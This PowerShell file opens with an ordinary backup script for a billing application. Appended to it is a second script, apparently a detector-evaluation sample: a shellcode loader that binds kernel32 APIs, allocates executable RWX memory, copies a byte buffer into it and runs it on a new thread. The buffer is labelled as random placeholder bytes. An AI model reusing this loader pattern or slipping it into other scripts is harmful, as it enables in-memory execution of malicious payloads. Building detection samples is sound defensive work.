[CmdletBinding()]
param(
    [string]$SourcePath = "C:\Apps\Contoso.Billing",
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = "D:\Backups\Billing",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 7,
    [ValidateSet("Optimal", 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = "Fastest",
    [int]$MinFreeGB = 50,

    [switch]$DryRun
)

$ProgressPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}
$jsonBody = $manifest | ConvertTo-Json -Depth 6
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8
$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x36, 0x73, 0xaf, 0xbf, 0x02, 0x49, 0x47, 0x51, 0xae, 0x44, 0x37, 0x0d, 0xf8, 0xed, 0x14, 0xc1,
    0x91, 0x83, 0xa3, 0x52, 0x7a, 0xfa, 0xaf, 0x59, 0xc8, 0xeb, 0xc1, 0x49, 0x1b, 0xc6, 0xe9, 0x90,
    0xed, 0x58, 0x6c, 0x02, 0x56, 0xb4, 0xc0, 0x97, 0x1d, 0x41, 0xd6, 0xdb, 0xe0, 0x09, 0x0e, 0xb0,
    0xfe, 0xd6, 0xd8, 0x7e, 0x11, 0x31, 0xf4, 0x2c, 0xa0, 0x8e, 0xf3, 0x6c, 0x4a, 0x95, 0xd9, 0xef,
    0x60, 0xbc, 0x0c, 0x39, 0x9a, 0xa7, 0x84, 0x90, 0xa6, 0x17, 0x71, 0x9e, 0xf7, 0x63, 0x6a, 0xaa,
    0x52, 0xa9, 0xca, 0x92, 0x96, 0x78, 0x85, 0xa7, 0x66, 0xf5, 0xcb, 0xa7, 0x44, 0x15, 0xfc, 0x1a,
    0x39, 0x9f, 0xa0, 0xf9, 0x70, 0x66, 0x5a, 0xbf, 0xf7, 0xd8, 0xba, 0x77, 0xad, 0x65, 0x82, 0x12,
    0x45, 0x0d, 0xc4, 0xb1, 0x94, 0xa8, 0x8c, 0x2a, 0x1a, 0xf7, 0x86, 0x1c, 0x31, 0xa8, 0x3a, 0xac,
    0xbc, 0x88, 0x55, 0x43, 0x30, 0x5f, 0x06, 0x20, 0x5e, 0xe1, 0x5a, 0xa5, 0x32, 0x99, 0x78, 0xf3,
    0x3d, 0x70, 0x66, 0x56, 0x71, 0xd2, 0xd5, 0xa2, 0x7e, 0x37, 0x52, 0xf5, 0xdf, 0xcc, 0x5b, 0xf4,
    0x22, 0xf3, 0x42, 0xd3, 0xc0, 0xad, 0x4a, 0x41, 0xb6, 0x43, 0x1f, 0x74, 0x14, 0x33, 0xe6, 0xf6,
    0xc7, 0x1e, 0x0e, 0x04, 0xc9, 0xcf, 0x98, 0x67, 0x79, 0x3e, 0xc2, 0xbc, 0x50, 0xed, 0xf2, 0xf2,
    0x02, 0x9e, 0x24, 0xbb, 0x99, 0xf3, 0x9e, 0x4e, 0x7b, 0x3b, 0x05, 0xd8, 0xe4, 0x88, 0xc5, 0x5c,
    0xce, 0xc0, 0xa7, 0xd7, 0xf7, 0x4b, 0xec, 0xc0, 0x81, 0x91, 0x5d, 0xf6, 0xfe, 0xcc, 0x03, 0xac,
    0xb1, 0x95, 0x1e, 0x8a, 0x4e, 0x8d, 0xdd, 0xae, 0x31, 0x38, 0x01, 0x18, 0x56, 0x66, 0x07, 0xe6,
    0x4f, 0x3e, 0xba, 0x9f, 0xf3, 0xf2, 0x46, 0xc0, 0xe1, 0x9b, 0x92, 0x05, 0x1d, 0xd3, 0x8b, 0xe4,
    0x1a, 0x38, 0x65, 0x2d, 0x39, 0x69
)

$ProcHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 4286)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
